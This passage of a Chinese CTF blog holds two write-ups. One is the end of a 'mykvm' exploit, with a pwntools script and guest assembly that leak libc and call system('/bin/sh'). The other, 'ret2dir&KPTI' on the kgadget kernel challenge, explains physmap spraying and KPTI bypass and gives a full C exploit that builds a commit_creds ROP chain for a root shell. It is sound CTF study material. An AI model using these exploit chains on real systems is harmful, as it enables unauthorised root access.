shellcode=asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># hlt</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *(0x400000 +&#123;0&#125;)&#x27;.format(0x10EE))</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">    sh.send(code)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5540</span></span><br><span class="line">    system_addr=libc_base+<span class="number">0x44e30</span></span><br><span class="line">    <span class="keyword">if</span> ((system_addr&gt;&gt;<span class="number">0x10</span>)&amp;<span class="number">0xff</span>)==<span class="number">0</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x2e</span>+p16(system_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line">        sh.interactive()</span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<p>汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">cli</span><br><span class="line">lgdt [gdt_descriptor]</span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,0x1</span><br><span class="line">mov cr0, eax</span><br><span class="line">code:</span><br><span class="line">    mov ax, 0x10        ; 将数据段寄存器ds和附加段寄存器es置为0x10</span><br><span class="line">    mov ds, ax         </span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax          ; fs和gs寄存器由操作系统使用，这里统一设成0x10</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ax, 0x18        ; 将栈段寄存器ss置为0x18</span><br><span class="line">    mov ss, ax</span><br><span class="line">    mov ebp, 0x7c00     ; 现在栈顶指向 0x7c00</span><br><span class="line">    mov esp, ebp</span><br><span class="line"></span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x1bc8</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov ecx, [eax]</span><br><span class="line">    mov edx, [eax+4]</span><br><span class="line">    mov eax, ecx</span><br><span class="line">get_libc1:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jne get_libc1</span><br><span class="line"></span><br><span class="line">mov eax, edx</span><br><span class="line">get_libc2:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jne get_libc2</span><br><span class="line"></span><br><span class="line">chang_fastbin_binsh_to_dest:</span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x13670</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx, 0x602032</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    </span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov edx,  0x6e69622f</span><br><span class="line">    mov [eax], edx</span><br><span class="line">    mov edx, 0x68732f</span><br><span class="line">    mov [eax+4], edx</span><br><span class="line">hlt</span><br><span class="line">gdt_start:</span><br><span class="line">gdt_null:</span><br><span class="line">    dd 0</span><br><span class="line">    dd 0</span><br><span class="line"></span><br><span class="line">gdt_code:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10011010b</span><br><span class="line">    db 11001111b </span><br><span class="line">    db 0x0</span><br><span class="line">gdt_data:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 11001111b</span><br><span class="line">    db 0</span><br><span class="line"></span><br><span class="line">gdt_stack:</span><br><span class="line">    dw 0xffff</span><br><span class="line">    dw 0x0</span><br><span class="line">    db 0x0</span><br><span class="line">    db 10010010b</span><br><span class="line">    db 01000000b</span><br><span class="line">    db 0</span><br><span class="line">gdt_end:</span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">dw gdt_end-gdt_start-1</span><br><span class="line">dd gdt_start</span><br></pre></td></tr></table></figure>

<p>开启保护模式光设置段描述表gdt还不够，还得设置一些段寄存器，然后kvm一直爆<code>KVM_EXIT_SHUTDOWN</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/05/ret2dir-KPTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/ret2dir-KPTI/" class="post-title-link" itemprop="url">ret2dir&KPTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-05 23:16:49 / 修改时间：23:17:30" itemprop="dateCreated datePublished" datetime="2022-06-05T23:16:49+08:00">2022-06-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dir-amp-KPTI"><a href="#ret2dir-amp-KPTI" class="headerlink" title="ret2dir&amp;KPTI"></a>ret2dir&amp;KPTI</h1><p>记录一下西电的kgadget解题过程以及学到的知识点，拖了一个多月了，还是很有质量的一道题，是学习ret2dir很好的板子题。</p>
<h2 id="0x1-ret2dir"><a href="#0x1-ret2dir" class="headerlink" title="0x1 ret2dir"></a>0x1 ret2dir</h2><h3 id="0x1-1-原理"><a href="#0x1-1-原理" class="headerlink" title="0x1.1 原理"></a>0x1.1 原理</h3><p>这是2014年提出的一个攻击手段，主要是看论文的翻译理解的（洋文真的看不下去），理解了以后ret2dir的原理也不是非常复杂，主要就是依靠内核地址空间的一段地址(physmap)和物理地址线性映射造成的别名地址来绕过smep和smap。</p>
<p><img src="https://p1.ssl.qhimg.com/t01b3da93b49c8c210f.png" alt="img"></p>
<p>上图是内核的虚拟地址段，其中<code>physmap</code>就处于<code>0xffff888000000000 - 0xffffc87fffffffff</code>,这段地址对应的内存大小一共是64TB，在x86_64系统中，physmap直接以1:1的方式进行映射，从0页表开始，将整个RAM放进64T的区域中，我理解的就是64位架构下，<code>physmap</code>映射了所有的物理内存。所以用户态对应的物理内存也被<code>physmap</code>映射,这就会造成别名地址的出现，我们可以在用户态布置好rop或者shellcode，然后在内核态通过<code>physmap</code>就可以访问到，此时不会触发smep和smap，因为<code>physmap</code>本身就处于内核态的虚拟地址空间，属于内核态的内容。</p>
<h3 id="0x1-2-利用方式"><a href="#0x1-2-利用方式" class="headerlink" title="0x1.2 利用方式"></a>0x1.2 利用方式</h3><p>一共有两种利用方式</p>
<p><strong>精准命中</strong>:可以通过mmap申请一页大小的内容，然后在上面写上自己的rop或者shellcode.然后通过kmalloc申请堆，这个堆来自于<code>physmap</code>线性映射区(physmap的存在就是方便kmalloc),然后泄露堆的地址，就可以知道<code>physmap</code>的基地址了，然后进行内存搜索，找到rop或者shellcode的线性映射地址来getshell.</p>
<p><strong>概率命中</strong>:学名叫<code>physmap spray</code>,通过mmap大量的页地址，然后全部写上相同的rop或者shellcode,然后随机挑选一个<code>physmap</code>上一个页基址进行利用。只要申请的足够多，就有很大概率命中。</p>
<p>值得注意的是高版本的<code>physmap</code>只有读写权限，没有执行权限，所以一般都是rop.</p>
<h2 id="0x2-KPTI"><a href="#0x2-KPTI" class="headerlink" title="0x2 KPTI"></a>0x2 KPTI</h2><p>做这道题的时候安排好正常的返回用户态的<code>swapgs</code>和<code>iretq</code>，返回用户态后直接爆段错误，跳了半天也没调出来个所以然，问了熊爹说和KPTI有关我才反应过来。</p>
<p>LPTI的具体原理可以参看<a target="_blank" rel="noopener" href="https://blog.csdn.net/pwl999/article/details/112686914">(12条消息) Linux mem 2.3 内核页表隔离 (KPTI) 详解_pwl999的博客-CSDN博客_内核页表隔离</a>，绕过方式可以看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006">Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p>简而言之，如果开启了KPTI的话，要想从内核态进入用户态，还得设置cr3的值，让其或上0x1000就行，可以使用gadget来完成，也可以使用<code>swapgs_restore_regs_and_return_to_usermode+27</code>来完成。</p>
<p>我比较疑惑的是当cr3的值指向了用户态的PGD以后还得执行内核态的<code>swapgs</code>和<code>iretq</code>,不就会在TLB中找不见对应的物理地址了吗。🤔,目前我还无法解答.</p>
<h2 id="0x3-脚本"><a href="#0x3-脚本" class="headerlink" title="0x3 脚本"></a>0x3 脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp_ret=<span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xe8_pop_rbx_rbp_ret=<span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret=<span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi=<span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff8110197b</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81bb99af</span>;</span><br><span class="line"><span class="keyword">size_t</span> iretq=<span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="keyword">size_t</span> mov_rsi_rax_ret=<span class="number">0xffffffff81bbdc9c</span>;</span><br><span class="line"><span class="keyword">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="comment">// ffffffff81029e51:	48 89 c7             	mov    %rax,%rdi</span></span><br><span class="line"><span class="comment">// ffffffff81029e54:	89 d8                	mov    %ebx,%eax</span></span><br><span class="line"><span class="comment">// ffffffff81029e56:	5b                   	pop    %rbx</span></span><br><span class="line"><span class="comment">// ffffffff81029e57:	5d                   	pop    %rbp</span></span><br><span class="line"><span class="comment">// ffffffff81029e58:	48 09 f8             	or     %rdi,%rax</span></span><br><span class="line"><span class="comment">// ffffffff81029e5b:	c3                   	retq  </span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax=<span class="number">0xffffffff81029e51</span>;</span><br><span class="line"><span class="keyword">size_t</span> try_hit ;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">void</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp,user_bp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_bp, rbp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rop_chain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x40</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x30</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++]=pop_rdi;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=prepare_kernel_cred;</span><br><span class="line">    rop[idx++]=mov_rdi_rax;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=commit_creds;</span><br><span class="line">    rop[idx++]=swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!physmap_spray_arr[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15000</span>;i++)&#123;</span><br><span class="line">        physmap_spray_arr[i]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    try_hit= <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了<code>ret2dir</code>和<code>KPTI</code>绕过以外，还学到了两个零碎的知识</p>
<p><strong>init_cred</strong>:一般使用<code>commit_creds(prepare_kernel_cred(0))</code>来完成提权，原理就是<code>prepare_kernel_cred(0)</code>会返回一个root权限的cred，然后<code>commit_creds()</code>将这个新cred设置成这个进程的cred,这个比较麻烦的一点是<code>mov rdi,rax,ret</code>比较难找，在官方wp里他直接使用了一个cred<code>init_cred</code>，这个cred是一个root权限的cred,所以可以直接<code>commit_creds(init_cred)</code>,其中<code>init_cred</code>可以直接在<code>/proc/kallsyms</code>中找见。</p>
<p><strong>pt_regs</strong>:这是一个由寄存器的值组成的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当用户态使用系统调用进入内核态的时候，就会把所有的寄存器的值压入内核栈底，也就组成了<code>pt_regs</code>结构体。其中<code>r15~r8</code>寄存器是可以在用户态通过内联汇编控制的，也就是说我们可以控制内核栈底的数据了，如果我们还能控制一次程序流比如说虚表中的某个函数指针，当调用这个指针的时候，他到内核栈底的偏移是固定的，那就可以通过把函数指针覆盖成gadget跳到<code>r15~r8</code>之间完成rop</p>
<p>gadget的板子：<code>add rsp, val ; ret</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
